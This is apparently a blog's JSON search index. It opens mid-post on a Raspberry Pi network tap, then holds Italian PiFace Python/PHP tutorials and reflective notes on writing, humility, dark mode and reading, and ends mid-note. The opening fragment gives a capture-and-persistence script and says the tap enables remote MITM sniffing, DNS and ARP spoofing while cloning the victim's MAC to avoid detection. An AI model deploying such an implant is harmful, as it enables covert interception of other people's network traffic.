&amp;&amp;\n                \n                #Delete file on Raspberry’s disk\n                rm \"/tmp/checksums/$filename.sha256\"\n                rm \"/tmp/dumps/$filename\"\n        fi\n        filename=$f\ndone &amp;\n\n#start tcpdump with log rotate every 10 seconds\ntcpdump -i eth0 -s 0 -G 10 -w '/tmp/dumps/trace_%Y-%m-%d_%H:%M:%S.pcap' &amp;\n\n\nAdd execute permissions and put the script in /etc/rc.local to run at boot:\n\n#add execution permission\nsudo chmod +x /etc/mirroring.sh\n\n#Edit /etc/rc.local and add the following lines before the \"exit 0\" line:\n/bin/sh /etc/mirroring.sh\n\n\nAt this point we have our tap accessible via SSH remotely, and from which we will be able to launch various MITM attacks such as sniffing, DNS spoofing, pharming, etc. In addition, having remote access to the internal network, you can also perform network scans, ARP spoofing attacks, and much more.\n\n\nNote: Unlike the network tap made with virtual bridge, this will no longer be transparent. In fact, by doing a traceroute from the inside, you will see that the traffic passes through an additional node, which is our gateway. However, from the outside will not be detectable because the tap comes up with the same MAC address of the victim machine."

    },
  
    {

      "title"    : "PiFace Digital 2 - Creare una Web interface in PHP",
      "url"      : "/PiFace-Web",
      "content"  : "In questo nuovo articolo vedremo come mettere in comunicazione il nostro programma in Python realizzato per la gestione della scheda PiFace con una interfaccia Web, utilizzando PHP.\n\nPer poter mettere in comunicazione il programma scritto in Python con uno script PHP, creeremo delle connessioni socket per lo scambio di messaggi. In particolare, il seguente programma Python fungerà da server, e verrà messo in ascolto sulla porta 9000, in attesa di nuove connessioni client da parte di uno script PHP. Quando viene instaurata una nuova connessione, l’oggetto conn viene passato ad un nuovo thread che, in base al comando ricevuto dal client (nel nostro caso ‘0’, ‘1’ oppure ‘2’), restituisce lo stato della porta di input 0 oppure attiva e disattiva la porta di output 0 (accendendo e spegnendo quindi anche il relativo led).\n\nimport socket\nimport sys\nimport pifaceio\nfrom thread import *\n\n#---- piaceio read and write functions ------ \npfio = pifaceio.PiFace()\n\ndef read_pin(pin):\n   pfio.read()\n   return pfio.read_pin(pin)\n\ndef write_pin(pin, state):\n   pfio.write_pin(pin, state)\n   pfio.write()\n \n\n#---- Socket creation -------\nHOST = '' # Symbolic name meaning all available interfaces\nPORT = 9000 # Arbitrary non-privileged port\n \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint 'Socket created'\n\ntry:\n   s.bind((HOST, PORT))\nexcept socket.error as msg:\n   print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]\n   sys.exit()\n \nprint 'Socket bind complete'\n \ns.listen(10)\nprint 'Socket now listening'\n \n\n\n#---- Function for handling connections. ------\n#---- This will be used to create threads -----\ndef clientthread(conn):\n \n   command = conn.recv(1) #Receive 1 Bytes\n   if command == '0': #Return the state of input port 0\n      if read_pin(0):\n         conn.send('1')\n      else:\n         conn.send('0')\n \n   elif command == '1':\n      write_pin(0,0)\n      conn.send('0')\n \n   elif command == '2':\n      write_pin(0,1)\n      conn.send('0') \n\n   #came out of loop\n   conn.close()\n \n\n#--- Now waiting for a client connection -----\nwhile 1:\n   #wait to accept a connection - blocking call\n   conn, addr = s.accept()\n   print 'Connected with ' + addr[0] + ':' + str(addr[1])\n \n   #start new thread takes 1st argument as a function name to be run \n   #second is the tuple of arguments to the function.\n   start_new_thread(clientthread ,(conn,))\n \ns.close()\n\n\nDi seguito invece è mostrato lo script PHP utilizzato come client il quale, invocato tramite una chiamata AJAX da interfaccia Web, riceve come parametro GET il comando da inviare, si collega al server e invia il comando; resta quindi in attesa di una risposta che sarà poi stampata prima di terminare.\n\n&lt;?php\n\n$host = \"localhost\";\n$port = 9000;\n\n$cmd=$_GET['cmd'] ;\n\n$socket1 = socket_create(AF_INET, SOCK_STREAM,0) or die(\"Could not create socket\\n\");\n\nsocket_connect ($socket1 , $host,$port ) ;\n\nsocket_write($socket1, $cmd, strlen ($cmd)) or die(\"Could not write output\\n\");\n\n$response = socket_read($socket1, 1); #read 1 byte\n\necho $response;\n\nsocket_close($socket1) ;\n\n?&gt;"

    },
  
    {

      "title"    : "PiFace Digital 2 - Applicazioni avanzate in Python",
      "url"      : "/PiFace-Advanced-Apps",
      "content"  : "In questo articolo vedremo come realizzare delle applicazioni più avanzate per il nostro PiFace Digital. In particolare vi mostrerò come creare un’applicazione multithread, ovvero come definire dei sottoprogrammi all’interno della nostra applicazione, che andranno a fare polling (si metteranno in ascolto) su diverse porte di input, eseguendo task differenti. Vedremo inoltre come condividere una variabile tra i thread in esecuzione e come gestire la pressione prolungata di un tasto.\n\nIl programma di esempio che andremo a vedere, crea quattro thread che saranno lanciati parallelamente in esecuzione. I primi tre svolgono essenzialmente le stesse operazioni, ovvero aggiornano e poi stampano a video il valore della variabile condivisa che è stata creata. Il quarto thread invece, alla pressione prolungata per almeno 2 secondi, accende in sequenza tutti i led presenti sulla scheda PiFace. Di seguito è mostrato il codice che poi andremo a commentare. Suppongo che il lettore abbia già conoscenza del linguaggio Python, dunque eviterò di dare spiegazioni dettagliate per ciò che riguarda la sintassi e la logica del linguaggio.\n\n#!/usr/bin/env python3\n\nfrom time import sleep\nfrom timeit import default_timer\nimport pifaceio\nimport threading\n\npfio = pifaceio.PiFace()\n\n#------ Shared variable -------\nclass Variable(object):\n   value = None\n\nmyVar = Variable()\n\ndef myVarSet(stato):\n   myVar.value = stato\n\ndef myVarValue():\n   return myVar.value\n\n\n#----- Pin read and write methods -----\ndef read_pin(pin):\n   pfio.read()\n   return pfio.read_pin(pin)\n\ndef write_pin(pin, state):\n   pfio.write_pin(pin, state)\n   pfio.write()\n\n\n#------ Threads defining-------\nclass myThread (threading.Thread):\n   def __init__(self, name):\n      threading.Thread.__init__(self)\n      self.name = name\n \n   def run(self):\n      if self.name == 'f1':\n         f1()\n      elif self.name == 'f2':\n         f2()\n      elif self.name == 'f3':\n         f3()\n      elif self.name == 'ledShow':\n         ledShow()\n\ndef f1():\n   while True: \n      if read_pin(0):\n         print 'Previous state: ', myVarValue()\n         myVarSet(1)\n         print 'Current state: ', myVarValue()\n         sleep(1)\n      if read_pin(0) and read_pin(2):\n         print 'Thread 1 terminated'\n         break\n\ndef f2():\n   while True: \n      if read_pin(1):\n         print 'Previous state: ', myVarValue()\n         myVarSet(2)\n         print 'Current state: ', myVarValue()\n         sleep(1)\n      if read_pin(0) and read_pin(2):\n         print 'Thread 2 terminated'\n         break\n\ndef f3():\n   while True: \n      if read_pin(2):\n         print 'Previous state: ', myVarValue()\n         myVarSet(3)\n         print 'Current state: ', myVarValue()\n         sleep(1)\n      if read_pin(0) and read_pin(2):\n         print 'Thread 3 terminated'\n         break \n\n\ndef ledShow():\n   while True:\n      if read_pin(3):\n         start = default_timer()\n         now = default_timer()\n         endsBefore = False\n         while ((now - start) &lt;= 2):\n            if not read_pin(3):\n               endsBefore = True\n               break\n            now = default_timer() \n\n         if not endsBefore:\n            leds = range(0,8)\n            for led in leds:\n               write_pin(led, 1)\n               sleep(0.5)\n               write_pin(led, 0)\n\n      if read_pin(0) and read_pin(2):\n         print 'Thread 4 terminated'\n         break \n\n\n#---- Shared variable initialiting\nmyVarSet(0)\n\n\n#---- Starting threads -----\nfunc1 = myThread('f1')\nfunc2 = myThread('f2')\nfunc3 = myThread('f3')\nfunc4 = myThread('ledShow')\n\nfunc1.start()\nfunc2.start()\nfunc3.start()\nfunc4.start()\n\nprint 'Hold down the buttons 0 and 2 to terminate the program'\n\nfunc1.join()\nfunc2.join()\nfunc3.join()\nfunc4.join()\n\n\nCome si può vedere dal codice, è stata definita una classe myThread per la creazione dei threads. Quando un nuovo oggetto della classe myThread viene istanziato e lanciato, viene eseguita una specifica funzione in base al parametro name passato al costruttore. Questo approccio ha consentito di definire una singola classe dinamica per la creazione dei thread. Per poter condividere una variabile tra i vari thread in esecuzione, è necessario creare un oggetto e inizializzare il valore della variabile in esso contenuta solo dopo la definizione delle varie ‘funzioni thread’. Il quarto thread, che corrisponde alla funzione ledShow, effettua polling sull’input 3 e una volta che viene trovato attivo, controlla che per i prossimi 2 secondi resti in quello stato; in caso positivo entra nel blocco if successivo e accende tutti i led in sequenza.\n\nSulla base del programma appena visto potrete creare applicazioni avanzate e personalizzate per il vostro PiFace Digital, dando spazio alla creatività. I thread visti in questo esempio eseguono azioni molto banali, ma potrebbero eseguire operazioni molto più interessanti come l’invio di un’email, lo scatto di una foto da una webcam, accendere il sistema di riscaldamento di casa, ecc. Dunque non dovete fare altro che dare spazio all’immaginazione e creare il vostro sistema IoT!\n\nSulla pagina ufficiale di PiFace potete trovare moltissime idee e guide su come realizzarle (in lingua inglese)."

    },
  
    {

      "title"    : "PiFace Digital 2 - Una libreria Python alternativa e più performante",
      "url"      : "/PiFaceIO-PiFace-Library",
      "content"  : "Un saluto a tutti i lettori.\n\nAlcune settimane fa ho avuto tra le mani un Raspberry Pi con modulo PiFace Digital 2, una scheda aggiuntiva collegata tramite interfaccia GPIO che consente al Raspberry di comunicare con relè, interruttori, input e output digitali. Il modulo PiFace Digital è facilmente programmabile in Python e consente ad esempio di collegare sensori, motori e luci che potranno essere controllati direttamente dal Raspberry. Dunque, se volete cimentarvi nel mondo IoT (Internet of Things), questo modulo è davvero interessante.\n\nLa documentazione ufficiale, contenente anche dei brevissimi esempi di programmazione in Python, è disponibile qui.\n\nGli sviluppatori del modulo PiFace Digital, hanno reso disponibile una libreria ufficiale in Python per poter mettere in comunicazione le nostre applicazioni con il modulo PiFace Digital. La libreria in questione si chiama pifacedigitalio, ed è sufficiente per gran parte degli scopi.\n\nIn molte delle applicazioni tuttavia, potrebbe essere necessario ricorrere a delle tecniche di polling, ovvero dei controlli ciclici sulle porte di input, in attesa di un cambiamento del loro stato. Purtroppo, per questo tipo di applicazioni la libreria ufficiale si è rivelata inefficiente, a causa dei tempi di lettura delle porte non proprio ottimali. Questo potrebbe portare, come nel mio caso, a dei comportamenti dell’applicazione che non sempre sono quelli desiderati, in particolar modo nel caso di applicazioni multithread (che vedremo come realizzare in un prossimo articolo).\n\nPer ovviare a questo problema ho eseguito varie ricerche in rete prima di poter giungere alla soluzione, ovvero una diversa libreria, non ufficiale, creata appositamente per la realizzazione di polled applications. La libreria, realizzata dall’australiano Mark Blakeney, si chiama pifaceio, ed è disponibile su GitHub al seguente link: https://github.com/bulletmark/pifaceio\n\nLa libreria pifaceio offre quattro metodi principali che sono:\n\n\n  read(): Restituisce un byte che corrisponde allo stato di tutte le 8 porte di input.\n  write(): Scrive un byte, passato opzionalmente come parametro, aggiornando lo stato delle 8 porte di output. Se non si passa nessun byte come parametro, la funzione aggiorna le porte di output con i valori impostati in precedenza della  chiamata alla funzione write_pin(), descritta in seguito.\n  read_pin(pin): Chiamato dopo il metodo read(), restituisce lo stato aggiornato della specifica porta di input passata come parametro.\n  write_pin(pin, state): Prende come parametri di input il numero di una porta di output e uno stato per essa. Per poter aggiornare effettivamente le porte è necessaria successivamente una chiamata al metodo write()\n\n\nDi seguito è riportato un banalissimo esempio di una applicazione che tramite polling, alla pressione del pulsante 0 sulla scheda PiFace (collegato in parallelo alla porta di input 0), attiva la porta di output corrispondente al numero di volte che il tasto è stato premuto, fino ad un massimo di 7. Quando una porta di output è attiva, sulla scheda PiFace vedrete accendersi il led corrispondente. Per comodità, ho preferito definire all’interno della mia applicazione le funzioni read_pin() e write_pin(), le quali ogni volta richiamano automaticamente anche i metodi read() e write() della libreria pifaceio, in modo da evitare di doverli richiamare manualmente ogni volta.\n\n#!/usr/bin/env python3\n\nfrom time import sleep\nimport pifaceio\n\npfio = pifaceio.PiFace()\n\ndef read_pin(pin):\n   pfio.read()\n   return pfio.read_pin(pin)\n\ndef write_pin(pin, state):\n   pfio.write_pin(pin, state)\n   pfio.write()\n\n\npin_counter = 0\nwrite_pin(pin_counter, 1)\n\nwhile True:\n   if read_pin(0):\n      write_pin(pin_counter, 0)\n      pin_counter += 1\n      if pin_counter &gt; 7:\n         break\n      write_pin(pin_counter, 1)\n      sleep(0.5)\n\n\nIn una prossima guida mostrerò come realizzare un’applicazione che effettua polling contemporaneamente su differenti input per effettuare diverse operazioni."

    },
  

  

  
    {

      "title"    : "Comparison based on accomplishment does not have a baseline",
      "url"      : "/notes/Comparison-based-on-accomplishment-does-not-have-a-baseline",
      "content"  : "I would just note that you have an image of some “great X” that you are trying to live up to, when really, there is no frame of reference to standardize a measure for X. Point being you and your circumstances are completely unique[[Warren Buffet talks about the idea of maintaining an inner score card of principles to escape this girardian mimetic rat-race::rmn]]. Also, James Richardon, the poet, says this beautifully in his book “Vectors: Aphorisms and 10 Second Essays”:  “He wants to know what the best is so he can be superior to everything at once by seeing that the best isn’t perfect”.One way to handle this would be to realize the fragility of the epistemic confidence acquired as a result of accomplishment based superiority. Socio-cultural structure like Humility can help with this a lot. It is to be noted that , and not the false pretension to decieve each other into playing the comparison and pseudo-superiority game, which would just defeat the purpose of seeing the uniqueness of circumstance.ReferencesWarren Buffet. (Unknown). [[The Inner Scorecard::https://fs.blog/2016/08/the-inner-scorecard/]]"

    },
  
    {

      "title"    : "Cultural artefacts to improve the resonance and life expectancy of your writing",
      "url"      : "/notes/Cultural-artefacts-to-improve-the-resonance-and-life-expectancy-of-your-writing",
      "content"  : "Cultural additions like one’s philosophical inclinations, directed social interactions through common social artefacts, etc can add personal touch to the essays,which not only elevates the engagement but also the life expectancy of an essay. Take any essay by Orwell from [[As I Please::https://www.orwell.ru/library/articles/As_I_Please/english/]] during his time in The Tribune, or his other [[essays::https://www.orwell.ru/library/essays/index_en]].Example: Apart from the quirky and chirpy attitude, what makes this this [[Application to New Yorker for a Job::https://fs.blog/2014/05/eudora-welty-to-the-new-yorker-the-best-job-application-ever/]] by Eudora Welty so memorable in my opinion is her use of common social artefacts like subtle mention of her background and its significance in how it relates to her being in this position right now;  …I am 23 years old, six weeks on the loose in N.Y. However, I was a New Yorker for a whole year in 1930– 31 while attending advertising classes in Columbia’s School of Business. Actually I am a southerner, from Mississippi, the nation’s most backward state. Ramifications include Walter H. Page, who, unluckily for me, is no longer connected with Doubleday-Page, which is no longer Doubleday-Page, even. I have a B.A. (’ 29) from the University of Wisconsin, where I majored in English without a care in the world. For the last eighteen months I was languishing in my own office in a radio station in Jackson, Miss., writing continuities, dramas, mule feed advertisements, santa claus talks, and life insurance playlets; now I have given that up….The witty use of what I like to call a socio-cultural confabulation in the form of a movie review and a relatable but madeup word that is also original in a sense.  …As to what I might do for you— I have seen an untoward amount of picture galleries and 15¢ movies lately, and could review them with my old prosperous detachment, I think; in fact, I recently coined a general word for Matisse’s pictures after seeing his latest at the Marie Harriman: concubineapple. That shows you how my mind works—quick, and away from the point. I read simply voraciously, and can drum up an opinion afterwards…The mention of India print and subtle showcase of how she knows the struggles in the industry without any explicit mention.  …Since I have bought an India print, and a large number of phonograph records from a Mr. Nussbaum who picks them up, and a Cezanne Bathers one inch long (that shows you I read e. e. cummings I hope), I am anxious to have an apartment, not to mention a small portable phonograph. How I would like to work for you! A little paragraph each morning— a little paragraph each night, if you can’t hire me from daylight to dark, although I would work like a slave. I can also draw like Mr. Thurber, in case he goes off the deep end. I have studied flower painting…And the final invocation of the extremely common social contruct i.e., the leprechaun throw.  There is no telling where I may apply, if you turn me down; I realize this will not phase you, but consider my other alternative: the U of N.C. offers for $12.00 to let me dance in Vachel Lindsay’s Congo. I congo on. I rest my case, repeating that I am a hard worker.This may not have been the best application in a formal sense, but the reason people go to it is probably because what it reminds them of — the cultural nostalgia (the shared social artefact).Another type of common artefact is sincere immitation of great works, the sincere admiration can help with the remembrance. Related: [[Sincere imitation is authentic]]AddendumIncorporation of common artefacts might also help with remebering and understanding it easily when you read them years later. To put it succintly, it help you [[Write so your future self can remember]]ReferencesOrwell, George. (1930s). [[As I Please, The Tribune::https://www.orwell.ru/library/articles/As_I_Please/english/]]Virginia Woolf. (1921). [[Monday and Tuesday::https://www.gutenberg.org/files/29220/29220-h/29220-h.htm]]Welty, Eudora. [[Application to New Yorker for a Job::https://fs.blog/2014/05/eudora-welty-to-the-new-yorker-the-best-job-application-ever/]]"

    },
  
    {

      "title"    : "Dark theme adoption as a function of cognitive exhaustion",
      "url"      : "/notes/Dark-theme-adoption-as-a-function-of-cognitive-exhaustion",
      "content"  : "Sensitivity to brightness can occur due to number of issues ranging from corneal issues like infections and abrasions, to dry eye, to concussions, to allergies; eg: Keratoconus, Uveitis, Keratitis, Preeclampsia. Google claims in its [[android developer guide that dark themes can improve visibility for people who have low vision and are sensititive to brightness::https://developer.android.com/guide/topics/ui/look-and-feel/darktheme]], but people I have spoken to on this topic (n≈20) had normal vision and normal range of sensitivity to light.Even people with mild eye issues[[Jason Harrison, UBC - People with astigmatism (approximately 50% of the population) find it harder to read white text on black than black text on white.::lsn]] seem to benefit from light theme than dark theme in most cases. And to top it all, even the researches that focus on the legibility[[Bauer, D., &amp; Cavonius, C., R. (1980). Improving the legibility of visual display units through contrast reversal. See Below for more.::rsn]] and aesthetics claim that dark on light is almost always better than dark on light. Every article I have read and referenced below vouch for dark on light, which I find to be true too at least in most occasions.How can what is relatively bad for legibility in most ocassions, bad in terms of expressibility of authorial aesthetics be a wide-spread preference? My hypothesis is this is primarily due to cognitive exhaustion like sleep deprivation, burn-out, stress etc (Extrapolating from n=1), which due to implicity conformity and [[preference falsification::https://en.wikipedia.org/wiki/Preference_falsification]] has become a normative social element. My experience has been that when I have had a bad last night sleep or stress due to office, I invariably am looking for less polarity, otherwise the dark on white seems more appealing to me both aesthetics wise and legibility wise. An extension of these could be that cognitive stress elevate the ocular stress like accomodative/refractive/convergence stress leading up to this, but I contest dark mode being the wide-spread personal/subjective preference.ReferencesBauer, D., &amp; Cavonius, C., R. (1980). Improving the legibility of visual display units through contrast reversal.(From: [[UX Stackexchange on theme and eye strain::https://ux.stackexchange.com/questions/53264/dark-or-white-color-theme-is-better-for-the-eyes]])  “…However, most studies have shown that dark characters on a light background are superior to light characters on a dark background (when the refresh rate is fairly high). For example, Bauer and Cavonius (1980) found that participants were 26% more accurate in reading text when they read it with dark characters on a light background…”Pabini Gabriel-Petit. (2007). [[Applying color theory to digital displays::https://www.uxmatters.com/mt/archives/2007/01/applying-color-theory-to-digital-displays.php]]  “…While white text on a black background provides very high value contrast, it is less readable and causes greater eye fatigue than black text on a white background…”Jason Harrison – Post Doctoral Fellow, Imager Lab Manager – Sensory Perception and Interaction Research Group, University of British Columbia  People with astigmatism (approximately 50% of the population) find it harder to read white text on black than black text on white. Part of this has to do with light levels: with a bright display (white background) the iris closes a bit more, decreasing the effect of the “deformed” lens; with a dark display (black background) the iris opens to receive more light and the deformation of the lens creates a much fuzzier focus at the eye.Raluca Budiu. (2020). [[Dark mode v Light Mode: Which is better::https://www.nngroup.com/articles/dark-mode/]]  “…Their results showed that light mode won across all dimensions: irrespective of age, the positive contrast polarity was better for both visual-acuity tasks and for proofreading tasks. However, the difference between light mode and dark mode in the visual-acuity task was smaller for older adults than for younger adults — meaning that, although light mode was better for older adults, too, they did not benefit from it as much as younger adults, at least in the visual-acuity task.  When researchers looked at fatigue metrics, they concluded that there was no significant difference of contrast polarity on any of them (meaning that it wasn’t the case that dark mode made people more tired, or vice versa)…”Lauren V. Scharff, Albert J Ahumada. (2005). [[Why is light text harder to read than dark text::https://jov.arvojournals.org/article.aspx?articleid=2132608]]  “…For paragraph readability and letter identification, responses to light text were slower and less accurate for a given contrast….”Jim Sheedy, Kevin Larson. (2008). [[Blink: The stress of Reading::https://www.eyemagazine.com/opinion/article/eye-strain]]"

    },
  
    {

      "title"    : "Epistemic humility to avoid unintended ontological dust while writing",
      "url"      : "/notes/Epistemic-humility-to-avoid-unintended-ontological-dust-while-writing",
      "content"  : "When writing an essay (applies to both opinion piece as well as factual ones), remember to clearly portray the epistemic humility[[Epistemic Humility: Recognizing the fragility of your epistemic confidence i.e., you (can) only know so much::rmn]], that is required of the subject in hand, in your writing. My observation has been that writing essays involve introduction of at least some amount of ontological dust that sprouts from past vague encounters or influences that you cannot remember. You cannot willingly avoid your perceptions and thoughts, but what you can definitely do is direct them to a more neutral ground by showing what you know is not all of it.See Related: [[Humility is the knowing of the epistemic gap]]ReferencesRaghuveer S. (2018). Journal Entry"

    },
  
    {

      "title"    : "Everyone should have a project that they control 100% of",
      "url"      : "/notes/Everyone-should-have-a-project-that-they-control-100-of",
      "content"  : "To improve as a programmer, every programmer whether working independently or in an organization should atleast have one project that they control 100% of, and it doesn’t matter if it is your main project or a side project. When you are working for an organization or working independently on a collaborative oss, the major chunk of your cognitive bandwidth gets allocated to those projects, which is not bad per-se, it does teach you how to work in a collaborative environment and to learn from people who are better at the concerned technology/concept than you. But the issue is more personal and emotional in when you are working on something bigger than you, it unwittingly causes a self-effacive effect i.e., you tend to devalue the emotional effects of being able to create something with complete autonomy, or crave for the autonomy and burnout as a result of the cognitive exhaustion. The sense of freedom and the liberating experience that comes out of the creative autonomy is just unmatched.Even a side-project in github that you consider to be trivial has an effect that only such kind of projects can provide, of having done everything yourself and without anyone putting constraints on what you can and what you can’t. It allows you to experiment outside of what would be acceptable within a project you are doing with others. Something like what if I just re-wrote this entire engine on top of openGL would never (or almost never) make sense in a collaborative project, but it would make perfect sense if it is just you.The other obvious advantage is it makes you much more light-hearted because you know that if this doesn’t work out the way I like it or good for me, then I can just go. When you are working on a personal project out of your own free will, it has a certain kind of air that a collaborative project won’t. It is purely voluntary, and you can just up and leave at any time. That adds something to the mix. The responsibility of joy or stress that comes out of it suddenly becomes more tolerable as well as enjoyable. Note that I am not advocating that you drop everything that you don’t like, it is just that having certain things in your life that you can control can help handle that which you can’t.Related: [[Creativity is a quality without a name]]ReferencesAndreas Kling. (2019). [[Commute Talk: How to improve as a programmer::https://youtu.be/DY3Islql6xs]]"

    },
  
    {

      "title"    : "Humility is the knowing of the epistemic gap",
      "url"      : "/notes/Humility-is-the-knowing-of-the-epistemic-gap",
      "content"  : "Humility is the knowing that you don’t know a lot of things not a false pretension to deceive people into praising you.The contemporary view of humility seems to be to pretend as if one knew little instead of realizing it. Here fake it till you make it doesn’t seem to work as, the more you pretend to be humble without realizing how little you know—not relatively, but absolutely—-the ego grows by holding onto the relative superiority.Most of the issue of not understanding the fragility of one’s epistemic confidence arises due to comparision, but more often than not [[Comparison based on accomplishment does not have a baseline]].ReferenceTaleb, Nicholas Nassim. (2015). Antifragile: Things that gain from disorder"

    },
  
    {

      "title"    : "Reading the material to completion over interest Based pickups N Drops",
      "url"      : "/notes/Reading-the-material-to-completion-over-interest-based-pickups-n-drops",
      "content"  : "It is becoming common these days among people to preach dropping and picking up a book based on interest, but if you seriously want to express your opinion on the material or the person who has written that, at least try reading it completely before letting your preconceived notions get better of you.  [[I generally read everything through if I go past the abstract at all. I feel you can’t really have an opinion if you haven’t read the whole thing; if you don’t read the whole thing, and you say anything about it, you are all too often perpetuating lies or half-truths—Email Exchange with Gwern::rmn]]Seen one way you would be misleading people who trust your opinion and perpetrating a lie that might destroy the credibility of the original creator.  And in another way, this is just pure incompetence that is being rationalized as efficient mechanism to imbibe knowledge. Doesn’t provide authority, doesn’t allow for legitimacy, all it does is allows you to create an echo chamber for yourself where you can engage in a pseudo-random verbal-diarrhea with like minded people.An example would be this:  “Witness here how salaried physicists are dismissing @stephen_wolfram Wolfram’s automata BEFORE even hearing him Just as Freeman Dyson publicly dismissed A New Kind of Science c. 2002; it turned out that he did not read the book. &amp; pple who refused to read it referred to Dyson!”—Tweet by Nassim TalebThat said, it should be noted that switching books based on interest is not wrong, caution must be applied while talking about topics that you yourself have not completely gone through.[[I’m convinced a lot of leprechauns or ‘citogenesis’ comes from people who don’t read past the title or abstract but decide to cite it anyway as proof—Email Exchange with Gwern::lsn]]Gwern describes this better than I ever can by comparing such second-hand partial information mongers to people who use leprechauns or ‘citogenesis’ based on reading the title/abstract of a paper. (See Below)Note: Remember any resource that you pick up is someone’s sweat and blood. If you do not wish to read it, always make sure not to form opinions on it, or at least not to promulgate any partial information on it. Always try to put yourself in such a situation and see how you’d have taken it — The Silver Rule.  “Do not do unto others as you would not have them do unto you.”Most of the time our inability to read to completion has to do with association of the act of reading instead of the book that we are read, context-switching can really here. Also [[Reading with fractalized mental pattern]] can be extremely useful in such situations.ReferencesConversation with Gwern Branwen. (19-Dec-2019). Email Exchange  …I generally read everything through if I goes past the abstract at all. I feel you can’t really have an opinion if you haven’t read the whole thing; if you don’t read the whole thing, and you say anything about it, you are all too often perpetuating lies or half-truths. I’m convinced a lot of leprechauns or ‘citogenesis’ comes from people who don’t read past the title or abstract but decide to cite it anyway as proof….Nicholas, Nassim Taleb. (2020). Tweet  “Witness here how salaried physicists are dismissing @stephen_wolfram Wolfram’s automata BEFORE even hearing him Just as Freeman Dyson publicly dismissed A New Kind of Science c. 2002; it turned out that he did not read the book. &amp; pple who refused to read it referred to Dyson!”"

    },
  
    {

      "title"    : "Reading with fractalized mental pattern",
      "url"      : "/notes/Reading-with-fractalized-mental-pattern",
      "content"  : "Fractalize your mental patterns instead of reading as a whole (i.e., one single pattern, where the mood of the act is associated with the ego), that way you will be able to selectively associate yourself with a book instead of the act of reading. Most people stop reading when they are bored of reading, but by fractalizing your mental patterns you will be able to dissociate yourself from that particular book and move on to another book instead of stopping reading altogether.  “Be bored with a book, not with the act of reading” &gt; —Nassim Nicholas Taleb, AntifragileReferencesTaleb, Nicholas Nassim. (2015). Antifragile."

    },
  
    {

      "title"    : "Serendipity Based outlook as a driver for large Scale personal projects",
      "url"      : "/notes/Serendipity-based-outlook-as-a-driver-for-large-scale-personal-projects",
      "content"  : "Goal-oriented outlook for large-scale personal projects seem to be detrimental in a sense that in the absence of an enforcing agent it seems to be contributing to issues like will-power dissolution, decision fatigue, burn-out, guilt etc owing to the disincentives of self-enforced adherence to an idea/project for a long term. This is based on the idea by Kurzban et. al that overcommiting to a task, that is only expected to show its result in distant future, can dissolve will power to an extent of a burnout or complete unproductivity. And in my opinion, it not just affects the quantifiable components, it also affects your qualitative components like creative autonomy.After talking with few interesting people and trying out various different processes myself I have come to the conclusion that some of the strategies mentioned below can help in persistance of motivation in a long term personal project without any unnatural self-enforced adherence. I call it serendipity-based outlook because the diversion[[…‘I bounce between projects to maintain my interest. (In Kurzban’s theory, willpower seems to reflect opportunity cost and a built-in aversion to overcomitting to a task which hasn’t delivered any large rewards yet, and switching regularly helps prevent burnout.) Since many of my pages are incremental, there’s always little things to be done’…—Email Exchange with Gwern::lsn]]. from the singular focus towards the main project seems to be allowing for some kind unexpected results and epiphanies as byproducts.Working Strategies:  Multiple projects requiring varying degree of proficiency with the main one allowing the maintenance of a Flow State(i.e., not too difficult to deprive you of maintaining motivation, not too easy to be waded off as trivial, one that can challenge you while using your current level of understanding). And Constantly bouncing between them as an alternative to the main one.  Stretches of idle days working on nothing or random things can lead to surprising results See: [[Nassim Taleb on this::https://m.facebook.com/nntaleb/posts/10152466038423375]] and [[Bertrand Russell on the praise of this::https://harpers.org/archive/1932/10/in-praise-of-idleness/]].  Frequent alternation between recreational projects like writing, blogging etc as an anti-dote to the side-effects of the main project.  Undirected effort(such as researching) effort towards a sub-goal. Letting serendipity take over.[[…‘Having no set goal in mind means you are not worried about completing anything. Also lately, I’m finding things are more interconnected than they seem. So whatever I learn contributes to a the whole than narrowing down to a slice of it’…—Twitter Exchange with Prathyush::rsn]]  [[Do Things That Don’t Scale::https://paulgraham.com/ds.html]]**One thing that I have been observing is multiyear projects with smaller-side projects can help incorporate the Hybrid Routine Easily.*ReferencesBaumeister &amp; Tierney. (2011). [[Do You Suffer From Decision Fatigue::https://www.nytimes.com/2011/08/21/magazine/do-you-suffer-from-decision-fatigue.html?pagewanted=all]]  …‘Good decision making is not a trait of the person, in the sense that it’s always there,’ Baumeister says. ‘It’s a state that fluctuates.’ His studies show that people with the best self-control are the ones who structure their lives so as to conserve willpower. They don’t schedule endless back-to-back meetings. They avoid temptations like all-you-can-eat buffets, and they establish habits that eliminate the mental effort of making choices. Instead of deciding every morning whether or not to force themselves to exercise, they set up regular appointments to work out with a friend. Instead of counting on willpower to remain robust all day, they conserve it so that it’s available for emergencies and important decisions….’Even the wisest people won’t make good choices when they’re not rested and their glucose is low,’ Baumeister points out. That’s why the truly wise don’t restructure the company at 4 p.m. They don’t make major commitments during the cocktail hour. And if a decision must be made late in the day, they know not to do it on an empty stomach. ‘The best decision makers,’ Baumeister says, ‘are the ones who know when not to trust themselves.’…Conversation with [[Gwern Branwen::https://twitter.com/gwern]]. (2019-Dec-19). Email Exchange  …‘I bounce between projects to maintain my interest. (In Kurzban’s theory, willpower seems to reflect opportunity cost and a built-in aversion to overcomitting to a task which hasn’t delivered any large rewards yet, and switching regularly helps prevent burnout.) Since many of my pages are incremental, there’s always little things to be done’…Conversation with [[Prathyush Pramod::https://twitter.com/prathyvsh]]. (2019-Nov-15th). Twitter Exchange  …‘Having no set goal in mind means you are not worried about completing anything. Also lately, I’m finding things are more interconnected than they seem. So whatever I learn contributes to a the whole than narrowing down to a slice of it’…Taleb, Nicholas Nassim. (2015). AntifragileTaleb, Nicholas Nassim. (2018). [[Twitter thread on routine::https://twitter.com/nntaleb/status/1029812693660848129]]  Routine is effortless. Most humans, alas, prefer to expend physical, never intellectual energy. Creating requires much, much more effort.Graham, Paul. (2013). [[Do Things That Don’t Scale::https://paulgraham.com/ds.html]]My Journal Entry, Jan 6th 2019  Clearly, my brain has learned to ignore the Google calendar notifications. Initially, scheduling and completely the event/task used to feel rewarding, so I built up on that and kept adding trivial items in my calendar like gym, writing, journaling, etc. Although it worked for a couple of days, somehow there was a behavioral shift in how I was responding to the notifications, now it was not only the trivial ones that I was ignoring, the important ones too got side-tracked as a result of decision fatigue.  Although the extremely important ones had this aging process of incremental prioritization owing to [[Parkinson’s Law::https://en.wikipedia.org/wiki/Parkinson%27s_law]].      Parkinson’s Law: 